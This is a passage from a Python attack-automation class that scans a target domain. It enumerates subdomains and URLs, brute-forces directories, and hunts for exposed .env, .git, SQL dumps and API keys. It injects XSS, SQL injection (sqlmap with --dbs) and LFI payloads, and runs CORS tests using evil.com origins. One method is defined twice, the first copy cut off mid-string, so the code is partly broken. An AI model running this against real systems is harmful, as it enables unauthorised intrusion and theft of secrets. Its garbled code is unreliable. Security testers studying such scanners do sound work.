                            n = n.strip().replace('*.', '')
                            if n and '.' in n and self.target_domain in n:
                                subdomains.add(n)
        except Exception as e:
            self.logger.warning(f"CT logs search failed: {e}")
    
    def search_engine_subdomains(self, subdomains):
        """Search engine dorking for subdomains"""
        # This would typically use Google dorking: site:*.example.com
        # For demo purposes, we'll simulate some common patterns
        patterns = ['mail', 'webmail', 'cpanel', 'admin', 'test', 'dev', 'staging']
        for pattern in patterns:
            subdomain = f"{pattern}.{self.target_domain}"
            try:
                socket.gethostbyname(subdomain)
                subdomains.add(subdomain)
            except:
                pass
    
    def dns_subdomain_bruteforce(self, subdomains):
        """DNS bruteforce with common patterns"""
        dns_patterns = [
            'api', 'app', 'blog', 'cdn', 'dev', 'ftp', 'git', 'img', 'mail', 'mobile',
            'ns1', 'ns2', 'shop', 'ssl', 'stage', 'test', 'vpn', 'www', 'admin', 'db',
            'old', 'new', 'beta', 'alpha', 'demo', 'sandbox', 'prod', 'production'
        ]
        
        def check_dns(subdomain):
            try:
                socket.gethostbyname(subdomain)
                return subdomain
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for pattern in dns_patterns:
                subdomain = f"{pattern}.{self.target_domain}"
                futures.append(executor.submit(check_dns, subdomain))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    subdomains.add(result)
    
    def filter_live_subdomains_advanced(self):
        """Phase 2: Advanced live subdomain filtering"""
        self.logger.info("Filtering live subdomains with multiple methods...")
        self.results['status'] = 'live_filtering'
        
        live_subdomains = []
        
        # Method 1: httpx-toolkit (if available)
        httpx_cmd = "cat all_subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 -o live_subdomains_httpx.txt"
        stdout, stderr, code = self.run_command(httpx_cmd)
        
        if code == 0:
            httpx_file = self.output_dir / "live_subdomains_httpx.txt"
            if httpx_file.exists():
                with open(httpx_file, 'r') as f:
                    live_subdomains.extend(line.strip() for line in f if line.strip())
        
        # Method 2: httprobe (alternative)
        httprobe_cmd = "cat all_subdomains.txt | httprobe | tee live_subdomains_httprobe.txt"
        stdout, stderr, code = self.run_command(httprobe_cmd)
        
        if code == 0:
            httprobe_file = self.output_dir / "live_subdomains_httprobe.txt"
            if httprobe_file.exists():
                with open(httprobe_file, 'r') as f:
                    live_subdomains.extend(line.strip() for line in f if line.strip())
        
        # Method 3: Manual HTTP checking (fallback)
        if not live_subdomains:
            self.manual_live_check_advanced()
        else:
            # Remove duplicates and save
            self.results['live_subdomains'] = list(set(live_subdomains))
            with open(self.output_dir / "live_subdomains_final.txt", 'w') as f:
                for url in sorted(set(live_subdomains)):
                    f.write(f"{url}\n")
        
        self.logger.info(f"Found {len(self.results['live_subdomains'])} live subdomains")
    
    def manual_live_check_advanced(self):
        """Advanced manual HTTP checking with multiple protocols and ports"""
        live_subdomains = []
        
        def check_subdomain_advanced(subdomain):
            results = []
            protocols = ['http', 'https']
            ports = ['', ':8080', ':8000', ':8888', ':9000', ':3000', ':5000']
            
            for protocol in protocols:
                for port in ports:
                    try:
                        url = f"{protocol}://{subdomain}{port}"
                        response = requests.get(url, timeout=10, verify=False, 
                                              allow_redirects=True)
                        if response.status_code < 500:
                            results.append(url)
                            # Also check for common status codes
                            if response.status_code in [200, 301, 302, 403]:
                                break  # Found working URL, no need to check other ports
                    except:
                        continue
            return results
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            future_to_sub = {executor.submit(check_subdomain_advanced, sub): sub 
                           for sub in self.results['subdomains']}
            
            for future in as_completed(future_to_sub):
                results = future.result()
                live_subdomains.extend(results)
        
        self.results['live_subdomains'] = live_subdomains
        
        # Save to file
        with open(self.output_dir / "live_subdomains_manual.txt", 'w') as f:
            for url in live_subdomains:
                f.write(f"{url}\n")
    
    def comprehensive_url_collection(self):
        """Phase 3: Comprehensive URL Collection - All methods from commands"""
        self.logger.info("Starting comprehensive URL collection...")
        self.results['status'] = 'url_collection'
        
        all_urls = set()
        
        # Method 1: Katana passive collection
        katana_cmd = f"katana -u {self.target_domain} -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o katana_urls.txt"
        stdout, stderr, code = self.run_command(katana_cmd)
        
        if code == 0:
            katana_file = self.output_dir / "katana_urls.txt"
            if katana_file.exists():
                with open(katana_file, 'r') as f:
                    all_urls.update(line.strip() for line in f if line.strip())
        
        # Method 2: Advanced URL fetching (from commands)
        advanced_katana_cmd = f"echo {self.target_domain} | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe > katana_advanced.txt"
        self.run_command(advanced_katana_cmd)
        
        katana_advanced_cmd2 = f"katana -u https://{self.target_domain} -d 5 | grep '=' | urldedupe >> katana_advanced.txt"
        self.run_command(katana_advanced_cmd2)
        
        # Method 3: GAU URL Collection
        gau_cmd = f"echo {self.target_domain} | gau --mc 200 | urldedupe > gau_urls.txt"
        stdout, stderr, code = self.run_command(gau_cmd)
        
        if code == 0:
            gau_file = self.output_dir / "gau_urls.txt"
            if gau_file.exists():
                with open(gau_file, 'r') as f:
                    all_urls.update(line.strip() for line in f if line.strip())
        
        # Method 4: Advanced GAU with filtering
        gau_filtered_cmd = f"cat gau_urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > gau_filtered.txt"
        self.run_command(gau_filtered_cmd)
        
        # Method 5: Wayback machine URLs
        self.wayback_url_collection(all_urls)
        
        # Method 6: Directory bruteforcing
        self.directory_bruteforce_comprehensive(all_urls)
        
        # Method 7: Robots.txt and sitemap parsing
        self.parse_robots_sitemap(all_urls)
        
        # Method 8: JavaScript endpoint extraction
        self.extract_js_endpoints(all_urls)
        
        # Save all URLs
        self.results['urls'] = list(all_urls)
        with open(self.output_dir / "all_urls_final.txt", 'w') as f:
            for url in sorted(all_urls):
                f.write(f"{url}\n")
        
        self.logger.info(f"Collected {len(all_urls)} total URLs")
    
    def wayback_url_collection(self, all_urls):
        """Wayback machine URL collection"""
        try:
            wayback_url = f"http://web.archive.org/cdx/search/cdx?url=*.{self.target_domain}/*&output=json&collapse=urlkey"
            response = requests.get(wayback_url, timeout=60)
            if response.status_code == 200:
                data = response.json()
                for entry in data[1:]:  # Skip header
                    if len(entry) > 2:
                        url = entry[2]
                        if url and url not in all_urls:
                            all_urls.add(url)
                            
            # Save wayback URLs separately
            wayback_urls = [url for url in all_urls if 'web.archive.org' not in url]
            self.results['wayback_urls'] = wayback_urls[:1000]  # Limit for performance
            
        except Exception as e:
            self.logger.warning(f"Wayback collection failed: {e}")
    
    def directory_bruteforce_comprehensive(self, all_urls):
        """Comprehensive directory bruteforcing - Multiple methods"""
        self.logger.info("Starting directory bruteforce...")
        
        # Method 1: dirsearch (from commands)
        for url in self.results['live_subdomains'][:5]:  # Limit for performance
            dirsearch_cmd = f"dirsearch -u {url} -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1 -o {url.replace('://', '_').replace('/', '_')}_dirsearch.txt"
            self.run_command(dirsearch_cmd, timeout=600)
        
        # Method 2: ffuf (from commands)
        for url in self.results['live_subdomains'][:3]:
            ffuf_cmd = f"ffuf -w /usr/share/wordlists/dirb/common.txt -u {url}/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -t 50 -o {url.replace('://', '_').replace('/', '_')}_ffuf.json"
            self.run_command(ffuf_cmd, timeout=600)
        
        # Method 3: Common directory checking
        self.check_common_directories(all_urls)
    
    def check_common_directories(self, all_urls):
        """Check common directories and files"""
        common_paths = [
            '/admin', '/administrator', '/login', '/wp-admin', '/phpmyadmin',
            '/cpanel', '/webmail', '/api', '/v1', '/v2', '/test', '/dev',
            '/staging', '/backup', '/.git', '/config', '/assets', '/uploads',
            '/files', '/images', '/js', '/css', '/includes', '/lib', '/libs',
            '/tmp', '/temp', '/cache', '/logs', '/log', '/debug', '/info',
            '/status', '/health', '/ping', '/robots.txt', '/sitemap.xml',
            '/.htaccess', '/.env', '/composer.json', '/package.json', '/web.config'
        ]
        
        def check_path(base_url, path):
            try:
                url = urljoin(base_url, path)
                response = requests.head(url, timeout=10, verify=False)
                if response.status_code < 400:
                    return url
            except:
                pass
            return None
        
        for base_url in self.results['live_subdomains'][:10]:
            with ThreadPoolExecutor(max_workers=20) as executor:
                futures = [executor.submit(check_path, base_url, path) for path in common_paths]
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        all_urls.add(result)
    
    def parse_robots_sitemap(self, all_urls):
        """Parse robots.txt and sitemap.xml"""
        for base_url in self.results['live_subdomains'][:10]:
            # Check robots.txt
            try:
                robots_url = urljoin(base_url, '/robots.txt')
                response = requests.get(robots_url, timeout=10, verify=False)
                if response.status_code == 200:
                    for line in response.text.split('\n'):
                        if line.startswith('Disallow:') or line.startswith('Allow:'):
                            path = line.split(':', 1)[1].strip()
                            if path and path != '/':
                                full_url = urljoin(base_url, path)
                                all_urls.add(full_url)
            except:
                pass
            
            # Check sitemap.xml
            try:
                sitemap_url = urljoin(base_url, '/sitemap.xml')
                response = requests.get(sitemap_url, timeout=10, verify=False)
                if response.status_code == 200:
                    # Parse XML and extract URLs
                    soup = BeautifulSoup(response.content, 'xml')
                    for loc in soup.find_all('loc'):
                        if loc.text:
                            all_urls.add(loc.text)
            except:
                pass
    
    def extract_js_endpoints(self, all_urls):
        """Extract endpoints from JavaScript files"""
        js_urls = [url for url in all_urls if url.endswith('.js')]
        
        for js_url in js_urls[:20]:  # Limit for performance
            try:
                response = requests.get(js_url, timeout=15, verify=False)
                if response.status_code == 200:
                    content = response.text
                    
                    # Extract API endpoints
                    api_patterns = [
                        r'["\'](/api/[^"\']+)["\']',
                        r'["\']([^"\']*\.php[^"\']*)["\']',
                        r'["\']([^"\']*\.asp[x]?[^"\']*)["\']',
                        r'["\']([^"\']*\.jsp[^"\']*)["\']'
                    ]
                    
                    for pattern in api_patterns:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            if match.startswith('/'):
                                base_url = urlparse(js_url).scheme + '://' + urlparse(js_url).netloc
                                full_url = urljoin(base_url, match)
                                all_urls.add(full_url)
            except:
                continue
    
    def comprehensive_sensitive_file_detection(self):
        """Phase 4: Comprehensive sensitive file detection"""
        self.logger.info("Scanning for sensitive files comprehensively...")
        self.results['status'] = 'sensitive_files'
        
        sensitive_files = []
        
        # Method 1: Pattern matching from URLs
        sensitive_pattern = '|'.join(self.sensitive_extensions)
        pattern = re.compile(f'\\.({sensitive_pattern})$', re.IGNORECASE)
        
        for url in self.results['urls']:
            if pattern.search(url):
                file_info = self.verify_file_accessibility(url)
                if file_info:
                    sensitive_files.append(file_info)
        
        # Method 2: Information disclosure scanner (from commands)
        info_disclosure_cmd = f"echo https://{self.target_domain} | gau | grep -E '\\.({sensitive_pattern})$' > sensitive_gau.txt"
        self.run_command(info_disclosure_cmd)
        
        # Method 3: Common sensitive file checking
        self.check_common_sensitive_files(sensitive_files)
        
        # Method 4: Backup file detection
        self.detect_backup_files(sensitive_files)
        
        # Method 5: Git repository detection
        self.detect_git_repositories()
        
        self.results['sensitive_files'] = sensitive_files
        self.logger.info(f"Found {len(sensitive_files)} potentially sensitive files")
    
    def verify_file_accessibility(self, url):
        """Verify if sensitive file is accessible"""
        try:
            response = requests.head(url, timeout=10, verify=False)
            if response.status_code == 200:
                return {
                    'url': url,
                    'type': url.split('.')[-1].lower(),
                    'status': response.status_code,
                    'size': response.headers.get('content-length', 'unknown'),
                    'content_type': response.headers.get('content-type', 'unknown'),
                    'last_modified': response.headers.get('last-modified', 'unknown')
                }
        except:
            pass
        return None
    
    def check_common_sensitive_files(self, sensitive_files):
        """Check for common sensitive files"""
        common_files = [
            '/.env', '/.git/config', '/config.php', '/database.yml',
            '/wp-config.php', '/web.config', '/.htaccess', '/composer.json',
            '/package.json', '/.DS_Store', '/thumbs.db', '/desktop.ini',
            '/phpinfo.php', '/info.php', '/test.php', '/backup.sql',
            '/dump.sql', '/db.sql', '/users.sql', '/passwords.txt'
        ]
        
        for base_url in self.results['live_subdomains'][:10]:
            for file_path in common_files:
                try:
                    url = urljoin(base_url, file_path)
                    response = requests.head(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        file_info = {
                            'url': url,
                            'type': 'sensitive_config',
                            'status': response.status_code,
                            'risk': 'High'
                        }
                        sensitive_files.append(file_info)
                except:
                    continue
    
    def detect_backup_files(self, sensitive_files):
        """Detect backup files"""
        backup_extensions = ['bak', 'backup', 'old', 'tmp', 'orig', '~']
        
        # Check for backup versions of common files
        common_files = ['index', 'admin', 'login', 'config', 'database']
        
        for base_url in self.results['live_subdomains'][:5]:
            for filename in common_files:
                for ext in backup_extensions:
                    for web_ext in ['php', 'asp', 'jsp', 'html']:
                        backup_url = f"{base_url}/{filename}.{web_ext}.{ext}"
                        try:
                            response = requests.head(backup_url, timeout=5, verify=False)
                            if response.status_code == 200:
                                sensitive_files.append({
                                    'url': backup_url,
                                    'type': 'backup_file',
                                    'status': response.status_code,
                                    'risk': 'High'
                                })
                        except:
                            continue
    
    def detect_git_repositories(self):
        """Detect exposed Git repositories"""
        git_exposures = []
        
        git_cmd = "cat live"

    def detect_git_repositories(self):
        """Detect exposed Git repositories"""
        git_exposures = []
        
        # Git repository detection (from commands)
        git_cmd = "cat live_subdomains_final.txt | httpx-toolkit -sc -server -cl -path '/.git/' -mc 200 -location -ms 'Index of' -probe"
        stdout, stderr, code = self.run_command(git_cmd)
        
        # Manual git detection
        for base_url in self.results['live_subdomains'][:10]:
            git_paths = ['/.git/', '/.git/config', '/.git/HEAD', '/.git/logs/HEAD']
            for path in git_paths:
                try:
                    url = urljoin(base_url, path)
                    response = requests.get(url, timeout=10, verify=False)
                    if response.status_code == 200 and ('ref:' in response.text or 'repository' in response.text.lower()):
                        git_exposures.append({
                            'url': url,
                            'type': 'git_exposure',
                            'status': response.status_code,
                            'risk': 'Critical'
                        })
                except:
                    continue
        
        self.results['github_repos'] = git_exposures
    
    def comprehensive_vulnerability_scanning(self):
        """Phase 5: Comprehensive vulnerability scanning - All methods"""
        self.logger.info("Starting comprehensive vulnerability scanning...")
        self.results['status'] = 'vulnerability_scan'
        
        # Method 1: Nuclei comprehensive scan
        nuclei_cmd = f"nuclei -u {self.target_domain} -t nuclei-templates/ -severity critical,high,medium -o nuclei_vulnerabilities.txt"
        self.run_command(nuclei_cmd, timeout=1800)
        
        # Method 2: Specific vulnerability scans
        self.xss_comprehensive_testing()
        self.sql_injection_comprehensive()
        self.lfi_comprehensive_testing()
        self.cors_comprehensive_testing()
        self.subdomain_takeover_check()
        self.aws_s3_bucket_discovery()
        self.api_key_detection()
        
        # Method 3: WordPress specific scanning
        self.wordpress_comprehensive_scan()
        
        # Method 4: Network scanning
        self.network_comprehensive_scan()
        
        # Method 5: JavaScript analysis
        self.javascript_comprehensive_analysis()
        
        self.logger.info("Vulnerability scanning completed")
    
    def xss_comprehensive_testing(self):
        """Comprehensive XSS testing - All methods from commands"""
        self.logger.info("Starting comprehensive XSS testing...")
        
        xss_vulnerabilities = []
        
        # Method 1: XSS hunting pipeline (from commands)
        xss_cmd = f"echo https://{self.target_domain}/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt"
        self.run_command(xss_cmd)
        
        # Method 2: XSS with Dalfox (from commands)
        dalfox_cmd = "cat all_urls_final.txt | grep '=' | dalfox pipe --silence"
        self.run_command(dalfox_cmd)
        
        # Method 3: Stored XSS finder (from commands)
        stored_xss_cmd = "cat all_urls_final.txt | grep -E '(login|signup|register|forgot|password|reset)' | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high"
        self.run_command(stored_xss_cmd)
        
        # Method 4: DOM XSS detection (from commands)
        dom_xss_cmd = "cat all_urls_final.txt | grep '\\.js$' | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt"
        self.run_command(dom_xss_cmd)
        
        # Method 5: Header-based XSS testing (from commands)
        header_xss_cmd = f"subfinder -d {self.target_domain} | gau | bxss -payload '\"><script>alert(1)</script>' -header 'X-Forwarded-For'"
        self.run_command(header_xss_cmd)
        
        # Method 6: Blind XSS testing (from commands)
        blind_xss_cmd = f"subfinder -d {self.target_domain} | gau | grep '&' | bxss -appendMode -payload '\"><script>alert(1)</script>' -parameters"
        self.run_command(blind_xss_cmd)
        
        # Method 7: Manual XSS testing
        self.manual_xss_testing(xss_vulnerabilities)
        
        self.results['xss_vulnerabilities'] = xss_vulnerabilities
    
    def manual_xss_testing(self, xss_vulnerabilities):
        """Manual XSS testing with payloads"""
        urls_with_params = [url for url in self.results['urls'] if '=' in url]
        
        def test_xss_payload(url, payload):
            try:
                # Test GET parameter
                if '=' in url:
                    test_url = re.sub(r'=([^&]*)', f'={quote(payload)}', url)
                    response = requests.get(test_url, timeout=10, verify=False)
                    if payload.replace('<', '&lt;').replace('>', '&gt;') not in response.text and payload in response.text:
                        return {
                            'url': test_url,
                            'payload': payload,
                            'type': 'reflected_xss',
                            'method': 'GET',
                            'risk': 'High'
                        }
                
                # Test POST parameter
                parsed_url = urlparse(url)
                if parsed_url.query:
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    params = dict(param.split('=') for param in parsed_url.query.split('&') if '=' in param)
                    
                    for param in params:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        response = requests.post(base_url, data=test_params, timeout=10, verify=False)
                        if payload in response.text:
                            return {
                                'url': base_url,
                                'parameter': param,
                                'payload': payload,
                                'type': 'post_xss',
                                'method': 'POST',
                                'risk': 'High'
                            }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url in urls_with_params[:50]:  # Limit for performance
                for payload in self.xss_payloads[:5]:
                    futures.append(executor.submit(test_xss_payload, url, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    xss_vulnerabilities.append(result)
    
    def sql_injection_comprehensive(self):
        """Comprehensive SQL injection testing"""
        self.logger.info("Starting SQL injection testing...")
        
        sqli_vulnerabilities = []
        
        # Method 1: SQLMap (from commands)
        for url in [u for u in self.results['urls'] if '=' in u][:10]:
            sqlmap_cmd = f"sqlmap -u '{url}' --forms --batch --level=3 --risk=3 --dbs --random-agent --timeout=30"
            stdout, stderr, code = self.run_command(sqlmap_cmd, timeout=600)
            
            if "vulnerable" in stdout.lower():
                sqli_vulnerabilities.append({
                    'url': url,
                    'tool': 'sqlmap',
                    'type': 'sql_injection',
                    'risk': 'Critical'
                })
        
        # Method 2: Manual SQL injection testing
        self.manual_sqli_testing(sqli_vulnerabilities)
        
        self.results['sql_injection'] = sqli_vulnerabilities
    
    def manual_sqli_testing(self, sqli_vulnerabilities):
        """Manual SQL injection testing"""
        urls_with_params = [url for url in self.results['urls'] if '=' in url]
        
        def test_sqli_payload(url, payload):
            try:
                original_response = requests.get(url, timeout=10, verify=False)
                original_time = original_response.elapsed.total_seconds()
                original_content = original_response.text
                
                # Test with payload
                test_url = re.sub(r'=([^&]*)', f'={quote(payload)}', url)
                test_response = requests.get(test_url, timeout=15, verify=False)
                test_time = test_response.elapsed.total_seconds()
                test_content = test_response.text
                
                # Check for SQL errors
                sql_errors = ['sql syntax', 'mysql', 'ora-', 'postgresql', 'sqlite', 'sybase']
                for error in sql_errors:
                    if error in test_content.lower() and error not in original_content.lower():
                        return {
                            'url': test_url,
                            'payload': payload,
                            'type': 'error_based_sqli',
                            'evidence': error,
                            'risk': 'High'
                        }
                
                # Check for time-based SQLi
                if test_time > original_time + 5:
                    return {
                        'url': test_url,
                        'payload': payload,
                        'type': 'time_based_sqli',
                        'time_difference': test_time - original_time,
                        'risk': 'High'
                    }
                    
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for url in urls_with_params[:20]:
                for payload in self.sqli_payloads[:4]:
                    futures.append(executor.submit(test_sqli_payload, url, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    sqli_vulnerabilities.append(result)
    
    def lfi_comprehensive_testing(self):
        """Comprehensive LFI testing - All methods from commands"""
        self.logger.info("Starting LFI testing...")
        
        lfi_vulnerabilities = []
        
        # Method 1: LFI methodology (from commands)
        lfi_cmd = f"echo 'https://{self.target_domain}/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u > lfi_urls.txt"
        self.run_command(lfi_cmd)
        
        # Method 2: FFUF LFI testing (from commands)
        ffuf_lfi_cmd = "ffuf -request lfi_request.txt -request-proto https -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -c -mr 'root:'"
        self.run_command(ffuf_lfi_cmd)
        
        # Method 3: Alternative LFI method (from commands)
        alt_lfi_cmd = f"echo 'https://{self.target_domain}/index.php?page=' | httpx-toolkit -paths /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\\*|\\$[^\\:]*):0:0:'"
        self.run_command(alt_lfi_cmd)
        
        # Method 4: Manual LFI testing
        self.manual_lfi_testing(lfi_vulnerabilities)
        
        self.results['lfi_vulnerabilities'] = lfi_vulnerabilities
    
    def manual_lfi_testing(self, lfi_vulnerabilities):
        """Manual LFI testing with payloads"""
        urls_with_params = [url for url in self.results['urls'] if '=' in url and any(param in url.lower() for param in ['file', 'page', 'include', 'path', 'doc'])]
        
        def test_lfi_payload(url, payload):
            try:
                test_url = re.sub(r'=([^&]*)', f'={quote(payload)}', url)
                response = requests.get(test_url, timeout=10, verify=False)
                
                # Check for LFI indicators
                lfi_indicators = ['root:x:', 'daemon:', 'bin:', 'sys:', 'adm:', '[boot loader]', 'user.dat']
                for indicator in lfi_indicators:
                    if indicator in response.text:
                        return {
                            'url': test_url,
                            'payload': payload,
                            'type': 'local_file_inclusion',
                            'evidence': indicator,
                            'risk': 'High'
                        }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for url in urls_with_params[:30]:
                for payload in self.lfi_payloads:
                    futures.append(executor.submit(test_lfi_payload, url, payload))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    lfi_vulnerabilities.append(result)
    
    def cors_comprehensive_testing(self):
        """Comprehensive CORS testing - All methods from commands"""
        self.logger.info("Starting CORS testing...")
        
        cors_issues = []
        
        # Method 1: Basic CORS check (from commands)
        cors_cmd = f"curl -H 'Origin: https://{self.target_domain}' -I https://{self.target_domain}/wp-json/"
        stdout, stderr, code = self.run_command(cors_cmd)
        
        # Method 2: CORScanner (from commands)
        corscanner_cmd = f"python3 CORScanner.py -u https://{self.target_domain} -d -t 10"
        self.run_command(corscanner_cmd)
        
        # Method 3: CORS Nuclei scan (from commands)
        cors_nuclei_cmd = "cat live_subdomains_final.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt"
        self.run_command(cors_nuclei_cmd)
        
        # Method 4: CORS origin reflection test (from commands)
        cors_reflection_cmd = f"curl -H 'Origin: https://evil.com' -I https://{self.target_domain}/api/data | grep -i 'access-control-allow-origin: https://evil.com'"
        stdout, stderr, code = self.run_command(cors_reflection_cmd)
        
        # Method 5: Corsy tool (from commands)
        corsy_cmd = "python3 corsy.py -i live_subdomains_final.txt -t 10 --headers 'User-Agent: GoogleBot\\nCookie: SESSION=Hacked'"
        self.run_command(corsy_cmd)
        
        # Method 6: Manual CORS testing
        self.manual_cors_testing(cors_issues)
        
        self.results['cors_issues'] = cors_issues
    
    def manual_cors_testing(self, cors_issues):
        """Manual CORS testing"""
        test_origins = ['https://evil.com', 'null', 'https://attacker.com']
        
        for url in self.results['live_subdomains'][:10]:
            for origin in test_origins:
                try:
                    headers = {'Origin': origin}
                    response = requests.get(url, headers=headers, timeout=10, verify=False)
                    
                    acao = response.headers.get('Access-Control-Allow-Origin', '')
                    acac = response.headers.get('Access-Control-Allow-Credentials', '')
                    
                    if acao == origin or acao == '*':
                        cors_issues.append({
                            'url': url,
                            'origin': origin,
                            'acao': acao,
                            'acac': acac,
                            'type': 'cors_misconfiguration',
                            'risk': 'High' if acac == 'true' else 'Medium'
                        })
                except:
                    continue
    
    def subdomain_takeover_check(self):
        """Subdomain takeover detection - From commands"""
        self.logger.info("Checking for subdomain takeover...")
        
        # Method 1: Subzy (from commands)
        subzy_cmd = "subzy run --targets all_subdomains.txt --concurrency 100 --hide_fails --verify_ssl"
        stdout, stderr, code = self.run_command(subzy_cmd)
        
        # Method 2: Manual takeover detection
        takeover_signatures = {
            'github.io': 'There isn\'t a GitHub Pages site here.',
            'herokuapp.com': 'No such app',
            'wordpress.com': 'Do you want to register',
            'aws.amazon.com': 'NoSuchBucket',
            'cloudfront.net': 'Bad Request',
            's3.amazonaws.com': 'NoSuchBucket'
        }
        
        takeover_results = []
        
        for subdomain in self.results['subdomains']:
            for service, signature in takeover_signatures.items():
                if service in subdomain:
                    try:
                        response = requests.get(f"http://{subdomain}", timeout=10, verify=False)
                        if signature in response.text:
                            takeover_results.append({
                                'subdomain': subdomain,
                                'service': service,
                                'signature': signature,
                                'type': 'subdomain_takeover',
                                'risk': 'Critical'
                            })
                    except:
                        pass
        
        self.results['subdomain_takeover'] = takeover_results
    
    def aws_s3_bucket_discovery(self):
        """AWS S3 bucket discovery - From commands"""
        self.logger.info("Discovering AWS S3 buckets...")
        
        # Method 1: s3scanner (from commands)
        s3scanner_cmd = f"s3scanner scan -d {self.target_domain}"
        stdout, stderr, code = self.run_command(s3scanner_cmd)
        
        # Method 2: Manual S3 bucket enumeration
        s3_buckets = []
        common_bucket_names = [
            self.target_domain.replace('.', '-'),
            self.target_domain.replace('.', ''),
            f"{self.target_domain.split('.')[0]}-backup",
            f"{self.target_domain.split('.')[0]}-files",
            f"{self.target_domain.split('.')[0]}-uploads",
            f"{self.target_domain.split('.')[0]}-assets"
        ]
        
        for bucket_name in common_bucket_names:
            s3_url = f"https://{bucket_name}.s3.amazonaws.com"
            try:
                response = requests.get(s3_url, timeout=10, verify=False)
                if response.status_code != 404:
                    s3_buckets.append({
                        'bucket': bucket_name,
                        'url': s3_url,
                        'status': response.status_code,
                        'type': 'aws_s3_bucket',
                        'accessible': response.status_code == 200
                    })
            except:
                continue
        
        self.results['aws_s3_buckets'] = s3_buckets
    
    def api_key_detection(self):
        """API key detection in JavaScript files - From commands"""
        self.logger.info("Detecting API keys in JavaScript files...")
        
        # Method 1: API key finder (from commands)
        api_cmd = "cat all_urls_final.txt | grep -E '\\.js$' | httpx-toolkit -mc 200 -content-type | grep -E 'application/javascript|text/javascript' | cut -d' ' -f1 | xargs -I% curl -s % | grep -E '(API_KEY|api_key|apikey|secret|token|password)'"
        stdout, stderr, code = self.run_command(api_cmd)
        
        # Method 2: Manual API key detection
        api_keys = []
        js_files = [url for url in self.results['urls'] if url.endswith('.js')]
        
        api_patterns = [
            r'api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
            r'secret[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
            r'token["\']?\s*[:=]\s*["\']([a-zA-Z0-9_-]{20,})["\']',
            r'password["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            r'aws[_-]?access[_-]?key["\']?\s*[:=]\s*["\']([A-Z0-9]{20})["\']',
            r'AKIA[0-9A-Z]{16}',  # AWS Access Key
            r'ya29\.[0-9A-Za-z\-_]+',  # Google OAuth
            r'sk_live_[0-9a-zA-Z]{24}',  # Stripe Live Key
            r'pk_live_[0-9a-zA-Z]{24}',  # Stripe Public Key
        ]
        
        for js_url in js_files[:20]:
            try:
                response = requests.get(js_url, timeout=15, verify=False)
                if response.status_code == 200:
                    content = response.text
                    
                    for pattern in api_patterns:
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        for match in matches:
                            api_keys.append({
                                'url': js_url,
                                'key': match,
                                'pattern': pattern,
                                'type': 'api_key_exposure',
                                'risk': 'Critical'
                            })
            except:
                continue
        
        self.results['api_keys'] = api_keys
    
    def wordpress_comprehensive_scan(self):
        """Comprehensive WordPress scanning - From commands"""
        self.logger.info("Starting WordPress scanning...")
        
        # Check if WordPress is detected
        wp_sites = []
        for url in self.results['live_subdomains'][:10]:
            try:
                response = requests.get(urljoin(url, '/wp-admin/'), timeout=10, verify=False)
                if response.status_code in [200, 302, 403]:
                    wp_sites.append(url)
            except:
                continue
        
        if wp_sites:
            # Method 1: WPScan aggressive (from commands)
            for wp_url in wp_sites:
                wpscan_cmd = f"wpscan --url {wp_url} --disable-tls-checks -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force --api-token YOUR_TOKEN"
                self.run_command(wpscan_cmd, timeout=900)
            
            # Method 2: Manual WordPress enumeration
            self.manual_wordpress_enum(wp_sites)
        
        self.results['wordpress_scan'] = wp_sites
    
    def manual_wordpress_enum(self, wp_sites):
        """Manual WordPress enumeration"""
        for wp_url in wp_sites:
            wp_paths = [
                '/wp-content/plugins/',
                '/wp-content/themes/',
                '/wp-includes/',
                '/wp-admin/',
                '/wp-login.php',
                '/xmlrpc.php',
                '/wp-config.php.bak',
                '/readme.html'
            ]
            
            for path in wp_paths:
                try:
                    response = requests.get(urljoin(wp_url, path), timeout=10, verify=False)
                    if response.status_code == 200:
                        self.logger.info(f"WordPress path accessible: {urljoin(wp_url, path)}")
                except:
